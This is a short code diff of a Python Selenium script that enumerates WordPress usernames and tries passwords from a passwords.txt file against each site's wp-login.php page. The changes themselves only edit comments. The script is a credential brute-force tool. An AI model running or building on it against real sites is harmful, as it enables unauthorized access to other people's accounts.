@@ -29,14 +29,11 @@ def get_users(browser, url):
             try_logging_in(browser, url, user['slug'])
 
 
-# Try logging in to wordpress
+# Try logging in to WordPress
 def try_logging_in(browser, url, username):
     browser.get(Browser.get_base_url(url) + "/wp-login.php")
     sleep(2)
-    # find username/email field and send the username itself to the input field
     browser.find_element(By.ID, "user_login").send_keys(username)
-    # find password input field and insert password as well
-
     with open(os.path.abspath(os.getcwd()) + "/passwords.txt") as f_in:
         lines = list(line for line in (l.strip() for l in f_in) if line)
         print('Try passwords on users:')
